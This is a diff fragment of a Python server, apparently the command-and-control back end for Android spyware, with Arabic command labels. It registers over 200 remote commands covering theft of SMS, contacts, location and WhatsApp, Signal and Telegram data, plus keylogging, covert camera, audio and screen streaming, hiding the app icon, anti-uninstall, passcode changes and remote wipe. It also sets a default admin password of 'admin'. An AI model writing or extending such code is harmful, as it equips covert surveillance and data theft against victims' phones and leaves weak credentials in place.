@@ -1,0 +1,473 @@
+    30→    75→_data_forward_dedup = {}  # data forward dedup: device_id:type -> timestamp
+    31→    76→_data_body_dedup = {}  # dedup for /api/data body endpoint: device_id:command -> {last_time, last_hash}
+    32→    77→
+    33→    78→firebase_connected = False  # Tracks Firebase connectivity status
+    34→    79→
+    35→    80→# حد أدنى بين رسائل البوت لنفس المحادثة (بالثواني)
+    36→    81→RATE_LIMIT_SECONDS = 1
+    37→    82→# حد أدنى بين إنشاء أكواد الربط (بالثواني)
+    38→    83→LINK_CODE_RATE_LIMIT = 3
+    39→    84→
+    40→    85→# ============================================================================
+    41→    86→# 200+ COMMAND REGISTRY - organized by category
+    42→    87→# ============================================================================
+    43→    88→
+    44→    89→COMMAND_REGISTRY = {
+    45→    90→    # Data Collection (20)
+    46→    91→    "sms":              {"cat": "data",    "cmd": "get_sms",              "desc": "📲 جلب الرسائل SMS",            "emoji": "📲"},
+    47→    92→    "calls":            {"cat": "data",    "cmd": "get_calls",            "desc": "📞 جلب سجل المكالمات",          "emoji": "📞"},
+    48→    93→    "contacts":         {"cat": "data",    "cmd": "get_contacts",         "desc": "📇 جلب جهات الاتصال",            "emoji": "📇"},
+    49→    94→    "location":         {"cat": "data",    "cmd": "get_location",         "desc": "📍 جلب الموقع الجغرافي",        "emoji": "📍"},
+    50→    95→    "notifications":    {"cat": "data",    "cmd": "get_notifications",    "desc": "🔔 جلب الإشعارات",              "emoji": "🔔"},
+    51→    96→    "apps":             {"cat": "data",    "cmd": "get_apps",             "desc": "📱 جلب التطبيقات المثبتة",      "emoji": "📱"},
+    52→    97→    "info":             {"cat": "data",    "cmd": "get_info",             "desc": "ℹ️ معلومات الجهاز",             "emoji": "ℹ️"},
+    53→    98→    "battery":          {"cat": "data",    "cmd": "get_battery",          "desc": "🔋 حالة البطارية",              "emoji": "🔋"},
+    54→    99→    "gallery":          {"cat": "data",    "cmd": "get_gallery",          "desc": "🖼️ المعرض",                     "emoji": "🖼️"},
+    55→   100→    "clipboard":        {"cat": "data",    "cmd": "get_clipboard",        "desc": "📋 الحافظة",                    "emoji": "📋"},
+    56→   101→    "all_data":         {"cat": "data",    "cmd": "get_all",         "desc": "📥 جميع البيانات",               "emoji": "📥"},
+    57→   102→    "wifi_info":        {"cat": "data",    "cmd": "get_wifi_info",        "desc": "📶 معلومات الواي فاي",          "emoji": "📶"},
+    58→   103→    "bluetooth_devices":{"cat": "data",    "cmd": "get_info",        "desc": "🔵 أجهزة البلوتوث",             "emoji": "🔵"},
+    59→   104→    "network_info":     {"cat": "data",    "cmd": "get_network_info",     "desc": "🌐 معلومات الشبكة",             "emoji": "🌐"},
+    60→   105→    "sim_info":         {"cat": "data",    "cmd": "get_sim_info",         "desc": "📱 معلومات الشريحة",            "emoji": "📱"},
+    61→   106→    "storage_info":     {"cat": "data",    "cmd": "get_storage_info",     "desc": "💾 معلومات التخزين",            "emoji": "💾"},
+    62→   107→    "installed_apps":   {"cat": "data",    "cmd": "get_installed_apps",   "desc": "📦 التطبيقات المثبتة",          "emoji": "📦"},
+    63→   108→    "running_apps":     {"cat": "data",    "cmd": "get_running_apps",     "desc": "⚡ التطبيقات النشطة",           "emoji": "⚡"},
+    64→   109→    "calendar":         {"cat": "data",    "cmd": "get_calendar",         "desc": "📅 التقويم",                    "emoji": "📅"},
+    65→   110→    "browser_history":  {"cat": "data",    "cmd": "get_browser_history",  "desc": "🌍 سجل المتصفح",               "emoji": "🌍"},
+    66→   111→
+    67→   112→    # Social Media (15)
+    68→   113→    "whatsapp":         {"cat": "social",  "cmd": "get_whatsapp",         "desc": "💬 واتساب",                     "emoji": "💬"},
+    69→   114→    "telegram_app":     {"cat": "social",  "cmd": "get_telegram",         "desc": "✈️ تليجرام",                    "emoji": "✈️"},
+    70→   115→    "instagram":        {"cat": "social",  "cmd": "get_instagram",        "desc": "📷 انستجرام",                   "emoji": "📷"},
+    71→   116→    "messenger":        {"cat": "social",  "cmd": "get_messenger",        "desc": "📘 ماسنجر",                     "emoji": "📘"},
+    72→   117→    "snapchat":         {"cat": "social",  "cmd": "get_snapchat",         "desc": "👻 سناب شات",                   "emoji": "👻"},
+    73→   118→    "tiktok":           {"cat": "social",  "cmd": "get_tiktok",           "desc": "🎵 تيك توك",                    "emoji": "🎵"},
+    74→   119→    "twitter":          {"cat": "social",  "cmd": "get_twitter",          "desc": "🐦 تويتر / X",                  "emoji": "🐦"},
+    75→   120→    "viber":            {"cat": "social",  "cmd": "get_viber",            "desc": "💜 فايبر",                      "emoji": "💜"},
+    76→   121→    "signal":           {"cat": "social",  "cmd": "get_signal",           "desc": "🟢 سيجنال",                     "emoji": "🟢"},
+    77→   122→    "facebook":         {"cat": "social",  "cmd": "get_facebook",         "desc": "📘 فيسبوك",                     "emoji": "📘"},
+    78→   123→    "whatsapp_status":  {"cat": "social",  "cmd": "get_whatsapp",  "desc": "📝 حالات واتساب",              "emoji": "📝"},
+    79→   124→    "whatsapp_stories": {"cat": "social",  "cmd": "get_whatsapp", "desc": "📖 قصص واتساب",                "emoji": "📖"},
+    80→   125→    "telegram_channels":{"cat": "social",  "cmd": "get_telegram","desc": "📺 قنوات تليجرام",             "emoji": "📺"},
+    81→   126→    "instagram_stories":{"cat": "social",  "cmd": "get_instagram","desc": "📸 قصص انستجرام",              "emoji": "📸"},
+    82→   127→    "youtube":          {"cat": "social",  "cmd": "get_tiktok",          "desc": "▶️ يوتيوب",                     "emoji": "▶️"},
+    83→   128→
+    84→   129→    # Remote Control (40)
+    85→   130→    "ping":             {"cat": "control", "cmd": "ping",                 "desc": "📡 فحص الاتصال",               "emoji": "📡"},
+    86→   131→    "vibrate":          {"cat": "control", "cmd": "vibrate",              "desc": "📳 اهتزاز",                     "emoji": "📳"},
+    87→   132→    "ring":             {"cat": "control", "cmd": "ring",                 "desc": "🔔 رنين",                      "emoji": "🔔"},
+    88→   133→    "screenshot":       {"cat": "control", "cmd": "screenshot",           "desc": "📸 لقطة شاشة",                 "emoji": "📸"},
+    89→   134→    "front_camera":     {"cat": "control", "cmd": "front_camera",         "desc": "📷 كاميرا أمامية",             "emoji": "📷"},
+    90→   135→    "back_camera":      {"cat": "control", "cmd": "back_camera",          "desc": "📷 كاميرا خلفية",              "emoji": "📷"},
+    91→   136→    "record_audio":     {"cat": "control", "cmd": "record_audio",         "desc": "🎙️ تسجيل صوتي",               "emoji": "🎙️"},
+    92→   137→    "record_video":     {"cat": "control", "cmd": "record_screen",         "desc": "🎬 تسجيل فيديو",               "emoji": "🎬"},
+    93→   138→    "lock_phone":       {"cat": "control", "cmd": "lock_phone",           "desc": "🔒 قفل الهاتف",                "emoji": "🔒"},
+    94→   139→    "unlock_phone":     {"cat": "control", "cmd": "unlock_phone",         "desc": "🔓 فتح الهاتف",                "emoji": "🔓"},
+    95→   140→    "reboot":           {"cat": "control", "cmd": "reboot",               "desc": "🔄 إعادة تشغيل",              "emoji": "🔄"},
+    96→   141→    "shutdown":         {"cat": "control", "cmd": "shutdown",             "desc": "⏻ إيقاف التشغيل",             "emoji": "⏻"},
+    97→   142→    "set_volume":       {"cat": "control", "cmd": "set_volume",           "desc": "🔊 تعيين الصوت",               "emoji": "🔊"},
+    98→   143→    "set_brightness":   {"cat": "control", "cmd": "set_brightness",       "desc": "☀️ تعيين السطوع",              "emoji": "☀️"},
+    99→   144→    "set_ringtone":     {"cat": "control", "cmd": "set_ringtone",         "desc": "🔔 تعيين النغمة",               "emoji": "🔔"},
+   100→   145→    "set_wallpaper":    {"cat": "control", "cmd": "set_wallpaper",        "desc": "🖼️ تعيين الخلفية",             "emoji": "🖼️"},
+   101→   146→    "enable_wifi":      {"cat": "control", "cmd": "enable_wifi",          "desc": "📶 تشغيل الواي فاي",           "emoji": "📶"},
+   102→   147→    "disable_wifi":     {"cat": "control", "cmd": "disable_wifi",         "desc": "📵 إيقاف الواي فاي",           "emoji": "📵"},
+   103→   148→    "enable_bluetooth": {"cat": "control", "cmd": "enable_bluetooth",     "desc": "🔵 تشغيل البلوتوث",            "emoji": "🔵"},
+   104→   149→    "disable_bluetooth":{"cat": "control", "cmd": "disable_bluetooth",    "desc": "❌ إيقاف البلوتوث",            "emoji": "❌"},
+   105→   150→    "enable_mobile_data":{"cat": "control","cmd": "enable_mobile_data",   "desc": "📶 تشغيل بيانات الجوال",       "emoji": "📶"},
+   106→   151→    "disable_mobile_data":{"cat":"control","cmd": "disable_mobile_data",  "desc": "📵 إيقاف بيانات الجوال",       "emoji": "📵"},
+   107→   152→    "enable_hotspot":   {"cat": "control", "cmd": "enable_hotspot",       "desc": "📡 تشغيل نقطة الاتصال",        "emoji": "📡"},
+   108→   153→    "disable_hotspot":  {"cat": "control", "cmd": "disable_hotspot",      "desc": "📵 إيقاف نقطة الاتصال",        "emoji": "📵"},
+   109→   154→    "airplane_on":      {"cat": "control", "cmd": "airplane_on",          "desc": "✈️ وضع الطيران - تشغيل",      "emoji": "✈️"},
+   110→   155→    "airplane_off":     {"cat": "control", "cmd": "airplane_off",         "desc": "📱 وضع الطيران - إيقاف",      "emoji": "📱"},
+   111→   156→    "auto_rotate_on":   {"cat": "control", "cmd": "set_auto_rotate",       "desc": "🔄 الدوران التلقائي - تشغيل", "emoji": "🔄"},
+   112→   157→    "auto_rotate_off":  {"cat": "control", "cmd": "set_auto_rotate",      "desc": "🔒 الدوران التلقائي - إيقاف", "emoji": "🔒"},
+   113→   158→    "torch_on":         {"cat": "control", "cmd": "torch_on",             "desc": "🔦 تشغيل الكشاف",              "emoji": "🔦"},
+   114→   159→    "torch_off":        {"cat": "control", "cmd": "torch_off",            "desc": "🔦 إطفاء الكشاف",              "emoji": "🔦"},
+   115→   160→    "play_sound":       {"cat": "control", "cmd": "play_sound",           "desc": "🔊 تشغيل صوت",                "emoji": "🔊"},
+   116→   161→    "speak_text":       {"cat": "control", "cmd": "speak_text",           "desc": "🗣️ نطق نص",                   "emoji": "🗣️"},
+   117→   162→    "show_notification":{"cat": "control", "cmd": "show_notification",    "desc": "🔔 إظهار إشعار",              "emoji": "🔔"},
+   118→   163→    "open_url":         {"cat": "control", "cmd": "open_url",             "desc": "🌐 فتح رابط",                  "emoji": "🌐"},
+   119→   164→    "send_sms":         {"cat": "control", "cmd": "send_sms",             "desc": "📲 إرسال رسالة SMS",           "emoji": "📲"},
+   120→   165→    "make_call":        {"cat": "control", "cmd": "make_call",            "desc": "📞 إجراء مكالمة",              "emoji": "📞"},
+   121→   166→    "block_number":     {"cat": "control", "cmd": "block_number",         "desc": "🚫 حظر رقم",                  "emoji": "🚫"},
+   122→   167→    "unblock_number":   {"cat": "control", "cmd": "unblock_number",       "desc": "✅ إلغاء حظر رقم",             "emoji": "✅"},
+   123→   168→
+   124→   169→    # App Management (20)
+   125→   170→    "open_app":         {"cat": "apps",    "cmd": "open_app",             "desc": "📱 فتح تطبيق",                 "emoji": "📱"},
+   126→   171→    "close_app":        {"cat": "apps",    "cmd": "close_app",            "desc": "❌ إغلاق تطبيق",               "emoji": "❌"},
+   127→   172→    "install_app":      {"cat": "apps",    "cmd": "install_app",          "desc": "📥 تثبيت تطبيق",               "emoji": "📥"},
+   128→   173→    "uninstall_app":    {"cat": "apps",    "cmd": "uninstall_app",        "desc": "🗑️ حذف تطبيق",                "emoji": "🗑️"},
+   129→   174→    "block_app":        {"cat": "apps",    "cmd": "block_app",            "desc": "🚫 حظر تطبيق",                "emoji": "🚫"},
+   130→   175→    "unblock_app":      {"cat": "apps",    "cmd": "unblock_app",          "desc": "✅ إلغاء حظر تطبيق",           "emoji": "✅"},
+   131→   176→    "clear_app_data":   {"cat": "apps",    "cmd": "clear_app_data",       "desc": "🧹 مسح بيانات تطبيق",         "emoji": "🧹"},
+   132→   177→    "force_stop_app":   {"cat": "apps",    "cmd": "force_stop_app",       "desc": "⛔ إيقاف قسري",               "emoji": "⛔"},
+   133→   178→    "app_info":         {"cat": "apps",    "cmd": "get_info",             "desc": "ℹ️ معلومات تطبيق",            "emoji": "ℹ️"},
+   134→   179→    "app_usage":        {"cat": "apps",    "cmd": "get_running_apps",            "desc": "📊 استخدام التطبيقات",        "emoji": "📊"},
+   135→   180→    "screen_time":      {"cat": "apps",    "cmd": "get_app_usage",          "desc": "⏱️ وقت الشاشة",               "emoji": "⏱️"},
+   136→   181→    "app_permissions":  {"cat": "apps",    "cmd": "get_info",      "desc": "🔐 صلاحيات التطبيق",          "emoji": "🔐"},
+   137→   182→    "enable_app":       {"cat": "apps",    "cmd": "open_app",           "desc": "✅ تفعيل تطبيق",              "emoji": "✅"},
+   138→   183→    "disable_app":      {"cat": "apps",    "cmd": "close_app",          "desc": "❌ تعطيل تطبيق",              "emoji": "❌"},
+   139→   184→    "list_blocked":     {"cat": "apps",    "cmd": "get_info",         "desc": "📋 قائمة التطبيقات المحظورة",  "emoji": "📋"},
+   140→   185→    "clear_cache":      {"cat": "apps",    "cmd": "clear_app_data",          "desc": "🧹 مسح الكاش",                "emoji": "🧹"},
+   141→   186→    "update_app":       {"cat": "apps",    "cmd": "install_app",           "desc": "⬆️ تحديث تطبيق",              "emoji": "⬆️"},
+   142→   187→    "launch_app":       {"cat": "apps",    "cmd": "open_app",           "desc": "🚀 تشغيل تطبيق",              "emoji": "🚀"},
+   143→   188→    "kill_app":         {"cat": "apps",    "cmd": "force_stop_app",             "desc": "💀 إنهاء تطبيق",               "emoji": "💀"},
+   144→   189→    "app_cache":        {"cat": "apps",    "cmd": "clear_app_data",            "desc": "💾 كاش التطبيقات",             "emoji": "💾"},
+   145→   190→
+   146→   191→    # File Management (25)
+   147→   192→    "list_files":       {"cat": "files",   "cmd": "list_files",           "desc": "📂 عرض الملفات",               "emoji": "📂"},
+   148→   193→    "get_file":         {"cat": "files",   "cmd": "get_file",             "desc": "📄 جلب ملف",                  "emoji": "📄"},
+   149→   194→    "download_file":    {"cat": "files",   "cmd": "get_file",        "desc": "⬇️ تحميل ملف",                "emoji": "⬇️"},
+   150→   195→    "list_downloads":   {"cat": "files",   "cmd": "list_files",       "desc": "📥 مجلد التحميلات",            "emoji": "📥"},
+   151→   196→    "list_dcim":        {"cat": "files",   "cmd": "list_files",            "desc": "📸 مجلد DCIM",                "emoji": "📸"},
+   152→   197→    "list_music":       {"cat": "files",   "cmd": "list_files",           "desc": "🎵 مجلد الموسيقى",            "emoji": "🎵"},
+   153→   198→    "list_videos":      {"cat": "files",   "cmd": "list_files",          "desc": "🎬 مجلد الفيديوهات",          "emoji": "🎬"},
+   154→   199→    "list_documents":   {"cat": "files",   "cmd": "list_files",       "desc": "📁 مجلد المستندات",            "emoji": "📁"},
+   155→   200→    "list_whatsapp":    {"cat": "files",   "cmd": "list_files",  "desc": "💬 ملفات واتساب",             "emoji": "💬"},
+   156→   201→    "list_telegram_files":{"cat":"files",  "cmd": "list_files",  "desc": "✈️ ملفات تليجرام",            "emoji": "✈️"},
+   157→   202→    "send_contacts_backup":{"cat":"files", "cmd": "send_backup_contacts", "desc": "📇 نسخة جهات الاتصال",          "emoji": "📇"},
+   158→   203→    "send_sms_backup":  {"cat": "files",   "cmd": "send_backup_sms",      "desc": "📲 نسخة الرسائل",              "emoji": "📲"},
+   159→   204→    "send_calls_backup":{"cat": "files",   "cmd": "send_backup_calls",    "desc": "📞 نسخة المكالمات",            "emoji": "📞"},
+   160→   205→    "send_whatsapp_backup":{"cat":"files", "cmd": "send_backup_whatsapp", "desc": "💬 نسخة واتساب",               "emoji": "💬"},
+   161→   206→    "send_full_backup": {"cat": "files",   "cmd": "send_backup_all",     "desc": "💾 نسخة احتياطية كاملة",       "emoji": "💾"},
+   162→   207→    "delete_file":      {"cat": "files",   "cmd": "delete_file",          "desc": "🗑️ حذف ملف",                  "emoji": "🗑️"},
+   163→   208→    "rename_file":      {"cat": "files",   "cmd": "rename_file",          "desc": "✏️ إعادة تسمية ملف",          "emoji": "✏️"},
+   164→   209→    "copy_file":        {"cat": "files",   "cmd": "copy_file",            "desc": "📋 نسخ ملف",                  "emoji": "📋"},
+   165→   210→    "move_file":        {"cat": "files",   "cmd": "move_file",            "desc": "📦 نقل ملف",                  "emoji": "📦"},
+   166→   211→    "create_folder":    {"cat": "files",   "cmd": "create_folder",        "desc": "📁 إنشاء مجلد",               "emoji": "📁"},
+   167→   212→    "get_folder_size":  {"cat": "files",   "cmd": "get_folder_size",      "desc": "📏 حجم المجلد",               "emoji": "📏"},
+   168→   213→    "search_files":     {"cat": "files",   "cmd": "search_files",         "desc": "🔍 بحث في الملفات",           "emoji": "🔍"},
+   169→   214→    "recent_files":     {"cat": "files",   "cmd": "recent_files",         "desc": "🕐 الملفات الأخيرة",           "emoji": "🕐"},
+   170→   215→    "file_info":        {"cat": "files",   "cmd": "file_info",            "desc": "ℹ️ معلومات ملف",              "emoji": "ℹ️"},
+   171→   216→    "zip_files":        {"cat": "files",   "cmd": "zip_files",            "desc": "📦 ضغط ملفات",                "emoji": "📦"},
+   172→   217→
+   173→   218→    # Security & Admin (15)
+   174→   219→    "wipe_data":        {"cat": "security","cmd": "wipe_data",            "desc": "💣 مسح البيانات",              "emoji": "💣"},
+   175→   220→    "factory_reset":    {"cat": "security","cmd": "factory_reset",        "desc": "⚠️ إعادة ضبط المصنع",         "emoji": "⚠️"},
+   176→   221→    "show_app":         {"cat": "security","cmd": "show_app",             "desc": "👁️ إظهار أيقونة التطبيق",     "emoji": "👁️"},
+   177→   222→    "hide_app":         {"cat": "security","cmd": "hide_app",             "desc": "🙈 إخفاء أيقونة التطبيق",     "emoji": "🙈"},
+   178→   223→    "change_passcode":  {"cat": "security","cmd": "change_passcode",      "desc": "🔑 تغيير رمز القفل",          "emoji": "🔑"},
+   179→   224→    "set_pin":          {"cat": "security","cmd": "change_passcode",              "desc": "🔢 تعيين رقم PIN",             "emoji": "🔢"},
+   180→   225→    "remove_pin":       {"cat": "security","cmd": "change_passcode",           "desc": "🔓 إزالة رقم PIN",             "emoji": "🔓"},
+   181→   226→    "enable_biometric": {"cat": "security","cmd": "enable_biometric",     "desc": "👤 تشغيل البصمة",             "emoji": "👤"},
+   182→   227→    "disable_biometric":{"cat": "security","cmd": "disable_biometric",    "desc": "❌ إيقاف البصمة",             "emoji": "❌"},
+   183→   228→    "anti_uninstall_on":{"cat": "security","cmd": "anti_uninstall_on",    "desc": "🛡️ الحماية من الحذف - تشغيل", "emoji": "🛡️"},
+   184→   229→    "anti_uninstall_off":{"cat":"security","cmd": "anti_uninstall_off",   "desc": "⛔ الحماية من الحذف - إيقاف", "emoji": "⛔"},
+   185→   230→    "device_admin_status":{"cat":"security","cmd":"device_admin_status",  "desc": "📋 حالة مسؤول الجهاز",        "emoji": "📋"},
+   186→   231→    "check_root":       {"cat": "security","cmd": "get_info",           "desc": "🧪 فحص الروت",                "emoji": "🧪"},
+   187→   232→    "set_screen_lock":  {"cat": "security","cmd": "lock_phone",      "desc": "🔒 تعيين قفل الشاشة",         "emoji": "🔒"},
+   188→   233→    "remove_screen_lock":{"cat":"security","cmd":"remove_screen_lock",    "desc": "🔓 إزالة قفل الشاشة",         "emoji": "🔓"},
+   189→   234→
+   190→   235→    # Monitoring (20)
+   191→   236→    "keylogger_start":  {"cat": "monitor", "cmd": "keylogger_start",      "desc": "⌨️ بدء تسجيل المفاتيح",        "emoji": "⌨️"},
+   192→   237→    "keylogger_stop":   {"cat": "monitor", "cmd": "keylogger_stop",       "desc": "⏹️ إيقاف تسجيل المفاتيح",     "emoji": "⏹️"},
+   193→   238→    "get_keylogger":    {"cat": "monitor", "cmd": "get_keylogger",        "desc": "📥 جلب بيانات لوحة المفاتيح",   "emoji": "📥"},
+   194→   239→    "screen_record_start":{"cat":"monitor","cmd":"screen_record_start",   "desc": "🔴 بدء تسجيل الشاشة",         "emoji": "🔴"},
+   195→   240→    "screen_record_stop":{"cat": "monitor","cmd": "stop_screen",   "desc": "⏹️ إيقاف تسجيل الشاشة",       "emoji": "⏹️"},
+   196→   241→    "clipboard_monitor_start":{"cat":"monitor","cmd":"clipboard_monitor_start","desc":"📋 بدء مراقبة الحافظة","emoji":"📋"},
+   197→   242→    "clipboard_monitor_stop":{"cat":"monitor","cmd":"clipboard_monitor_stop","desc":"⏹️ إيقاف مراقبة الحافظة","emoji":"⏹️"},
+   198→   243→    "get_clipboard_log":{"cat": "monitor", "cmd": "get_clipboard",    "desc": "📋 سجل الحافظة",               "emoji": "📋"},
+   199→   244→    "wifi_monitor_start":{"cat": "monitor", "cmd": "get_wifi_info",  "desc": "📡 بدء مراقبة الواي فاي",     "emoji": "📡"},
+   200→   245→    "wifi_monitor_stop":{"cat": "monitor", "cmd": "get_wifi_info",   "desc": "⏹️ إيقاف مراقبة الواي فاي",   "emoji": "⏹️"},
+   201→   246→    "app_monitor_start":{"cat": "monitor", "cmd": "get_running_apps",    "desc": "📱 بدء مراقبة التطبيقات",      "emoji": "📱"},
+   202→   247→    "app_monitor_stop": {"cat": "monitor", "cmd": "get_running_apps",     "desc": "⏹️ إيقاف مراقبة التطبيقات",   "emoji": "⏹️"},
+   203→   248→    "get_app_log":      {"cat": "monitor", "cmd": "get_running_apps",          "desc": "📋 سجل التطبيقات",             "emoji": "📋"},
+   204→   249→    "location_live":    {"cat": "monitor", "cmd": "location_live",        "desc": "🗺️ تتبع مباشر",               "emoji": "🗺️"},
+   205→   250→    "location_stop":    {"cat": "monitor", "cmd": "location_stop",        "desc": "⏹️ إيقاف التتبع",             "emoji": "⏹️"},
+   206→   251→    "location_history": {"cat": "monitor", "cmd": "get_location",     "desc": "📜 سجل المواقع",              "emoji": "📜"},
+   207→   252→    "geo_add":          {"cat": "monitor", "cmd": "get_location",              "desc": "➕ إضافة منطقة جغرافية",       "emoji": "➕"},
+   208→   253→    "geo_remove":       {"cat": "monitor", "cmd": "get_location",           "desc": "➖ حذف منطقة جغرافية",         "emoji": "➖"},
+   209→   254→    "geo_list":         {"cat": "monitor", "cmd": "get_location",             "desc": "📋 قائمة المناطق الجغرافية",   "emoji": "📋"},
+   210→   255→    "sms_monitor":      {"cat": "monitor", "cmd": "get_sms",          "desc": "📲 مراقبة الرسائل",            "emoji": "📲"},
+   211→   256→    "call_monitor":     {"cat": "monitor", "cmd": "get_calls",         "desc": "📞 مراقبة المكالمات",          "emoji": "📞"},
+   212→   257→
+   213→   258→    # System Settings (15)
+   214→   259→    "set_language":     {"cat": "syssettings", "cmd": "set_language",     "desc": "🌐 تعيين اللغة",               "emoji": "🌐"},
+   215→   260→    "set_timezone":     {"cat": "syssettings", "cmd": "set_timezone",     "desc": "🕐 تعيين المنطقة الزمنية",     "emoji": "🕐"},
+   216→   261→    "set_alarm":        {"cat": "syssettings", "cmd": "set_alarm",        "desc": "⏰ تعيين منبه",                "emoji": "⏰"},
+   217→   262→    "set_timer":        {"cat": "syssettings", "cmd": "set_alarm",        "desc": "⏱️ تعيين مؤقت",               "emoji": "⏱️"},
+   218→   263→    "set_reminder":     {"cat": "syssettings", "cmd": "set_alarm",     "desc": "📝 تعيين تذكير",              "emoji": "📝"},
+   219→   264→    "enable_dev_mode":  {"cat": "syssettings", "cmd": "enable_dev_mode",  "desc": "🔧 تشغيل وضع المطور",         "emoji": "🔧"},
+   220→   265→    "disable_dev_mode": {"cat": "syssettings", "cmd": "disable_dev_mode", "desc": "❌ إيقاف وضع المطور",         "emoji": "❌"},
+   221→   266→    "enable_usb_debug": {"cat": "syssettings", "cmd": "enable_usb_debug", "desc": "🔌 تشغيل تصحيح USB",          "emoji": "🔌"},
+   222→   267→    "disable_usb_debug":{"cat": "syssettings", "cmd": "disable_usb_debug","desc": "❌ إيقاف تصحيح USB",          "emoji": "❌"},
+   223→   268→    "dns_change":       {"cat": "syssettings", "cmd": "dns_change",       "desc": "🌐 تغيير DNS",               "emoji": "🌐"},
+   224→   269→    "proxy_set":        {"cat": "syssettings", "cmd": "proxy_set",        "desc": "🔀 تعيين بروكسي",             "emoji": "🔀"},
+   225→   270→    "apn_settings":     {"cat": "syssettings", "cmd": "apn_settings",     "desc": "📶 إعدادات APN",             "emoji": "📶"},
+   226→   271→    "nfc_on":           {"cat": "syssettings", "cmd": "nfc_on",           "desc": "📡 تشغيل NFC",               "emoji": "📡"},
+   227→   272→    "nfc_off":          {"cat": "syssettings", "cmd": "nfc_off",          "desc": "❌ إيقاف NFC",               "emoji": "❌"},
+   228→   273→    "auto_update_on":   {"cat": "syssettings", "cmd": "auto_update_on",   "desc": "⬆️ التحديث التلقائي - تشغيل", "emoji": "⬆️"},
+   229→   274→    "auto_update_off":  {"cat": "syssettings", "cmd": "auto_update_off",  "desc": "⏸️ التحديث التلقائي - إيقاف", "emoji": "⏸️"},
+   230→   275→
+   231→   276→    # Streaming (15)
+   232→   277→    "start_screen_stream": {"cat": "streaming", "cmd": "start_screen_stream", "desc": "🖥️ بث الشاشة", "emoji": "🖥️"},
+   233→   278→    "stop_screen_stream":  {"cat": "streaming", "cmd": "stop_screen_stream",  "desc": "⏹️ إيقاف بث الشاشة", "emoji": "⏹️"},
+   234→   279→    "start_camera_stream": {"cat": "streaming", "cmd": "start_camera_stream", "desc": "📷 بث الكاميرا", "emoji": "📷"},
+   235→   280→    "stop_camera_stream":  {"cat": "streaming", "cmd": "stop_camera_stream",  "desc": "⏹️ إيقاف بث الكاميرا", "emoji": "⏹️"},
+   236→   281→    "switch_camera":       {"cat": "streaming", "cmd": "switch_camera",       "desc": "🔄 تبديل الكاميرا", "emoji": "🔄"},
+   237→   282→    "start_audio_stream":  {"cat": "streaming", "cmd": "start_audio_stream",  "desc": "🎙️ بث الصوت", "emoji": "🎙️"},
+   238→   283→    "stop_audio_stream":   {"cat": "streaming", "cmd": "stop_audio_stream",   "desc": "⏹️ إيقاف بث الصوت", "emoji": "⏹️"},
+   239→   284→    "get_stream_status":   {"cat": "streaming", "cmd": "get_stream_status",   "desc": "📊 حالة البث", "emoji": "📊"},
+   240→   285→    "set_stream_quality":  {"cat": "streaming", "cmd": "set_stream_quality",  "desc": "⚙️ جودة البث", "emoji": "⚙️"},
+   241→   286→    "enable_torch":        {"cat": "streaming", "cmd": "enable_torch",        "desc": "🔦 الكشاف", "emoji": "🔦"},
+   242→   287→    "pause_stream":        {"cat": "streaming", "cmd": "pause_stream",        "desc": "⏸️ إيقاف مؤقت", "emoji": "⏸️"},
+   243→   288→    "resume_stream":       {"cat": "streaming", "cmd": "resume_stream",       "desc": "▶️ استئناف", "emoji": "▶️"},
+   244→   289→    "stop_all_streams":    {"cat": "streaming", "cmd": "stop_all_streams",    "desc": "⏹️ إيقاف كل البث", "emoji": "⏹️"},
+   245→   290→    "get_stream_capabilities": {"cat": "streaming", "cmd": "get_stream_capabilities", "desc": "📋 إمكانيات البث", "emoji": "📋"},
+   246→   291→}
+   247→   292→
+   248→   293→# ============================================================================
+   249→   294→# DATA HELPERS
+   250→   295→# ============================================================================
+   251→   296→
+   252→   297→# Module-level IP -> device_id mapping (for upload identification)
+   253→   298→_ip_device_map = {}
+   254→   299→# Module-level latest frame cache (accessible from upload handler at module level)
+   255→   300→_latest_frames_module = {}
+   256→   301→# Module-level JPEG stream task tracking
+   257→   302→_jpeg_stream_tasks_module = {}
+   258→   303→_jpeg_stream_info = {}
+   259→   304→
+   260→   305→def _get_real_ip(request):
+   261→   306→    """Extract real client IP from request, handling reverse proxy headers."""
+   262→   307→    forwarded = request.headers.get("X-Forwarded-For", "").strip()
+   263→   308→    if forwarded:
+   264→   309→        return forwarded.split(",")[0].strip()
+   265→   310→    real_ip = request.headers.get("X-Real-IP", "").strip()
+   266→   311→    if real_ip:
+   267→   312→        return real_ip
+   268→   313→    return request.remote or ""
+   269→   314→
+   270→   315→def ensure_data_dir():
+   271→   316→    DATA_DIR.mkdir(parents=True, exist_ok=True)
+   272→   317→    defaults = {
+   273→   318→        DEVICES_FILE: [],
+   274→   319→        SESSIONS_FILE: [],
+   275→   320→        COMMANDS_FILE: [],
+   276→   321→        EVENTS_FILE: [],
+   277→   322→        SETTINGS_FILE: {
+   278→   323→            "admin_password": "admin",
+   279→   324→            "sync_interval": 300,
+   280→   325→            "location_interval": 60,
+   281→   326→            "auto_location": True,
+   282→   327→            "auto_sync": True,
+   283→   328→            "language": "ar",
+   284→   329→            "notifications": True,
+   285→   330→            "keylogger": False,
+   286→   331→            "sim_detect": False,
+   287→   332→            "wifi_monitor": False,
+   288→   333→            "geofences": [],
+   289→   334→        },
+   290→   335→        LINK_CODES_FILE: [],
+   291→   336→    }
+   292→   337→    for fpath, default in defaults.items():
+   293→   338→        if not fpath.exists():
+   294→   339→            fpath.write_text(json.dumps(default, ensure_ascii=False, indent=2))
+   295→   340→
+   296→   341→
+   297→   342→def load_json(path, default=None):
+   298→   343→    try:
+   299→   344→        if path.exists():
+   300→   345→            return json.loads(path.read_text())
+   301→   346→    except Exception as exc:
+   302→   347→        log.error("Failed to load %s: %s", path, exc)
+   303→   348→    return default if default is not None else []
+   304→   349→
+   305→   350→
+   306→   351→def save_json(path, data):
+   307→   352→    try:
+   308→   353→        path.write_text(json.dumps(data, ensure_ascii=False, indent=2))
+   309→   354→    except Exception as exc:
+   310→   355→        log.error("Failed to save %s: %s", path, exc)
+   311→   356→
+   312→   357→
+   313→   358→def append_event(event, details=None, level="info"):
+   314→   359→    events = load_json(EVENTS_FILE, [])
+   315→   360→    events.append({
+   316→   361→        "time": datetime.now(timezone.utc).isoformat(),
+   317→   362→        "event": event,
+   318→   363→        "details": details or {},
+   319→   364→        "level": level,
+   320→   365→    })
+   321→   366→    if len(events) > 2000:
+   322→   367→        events = events[-2000:]
+   323→   368→    save_json(EVENTS_FILE, events)
+   324→   369→
+   325→   370→
+   326→   371→def load_settings():
+   327→   372→    return load_json(SETTINGS_FILE, {
+   328→   373→        "admin_password": "admin",
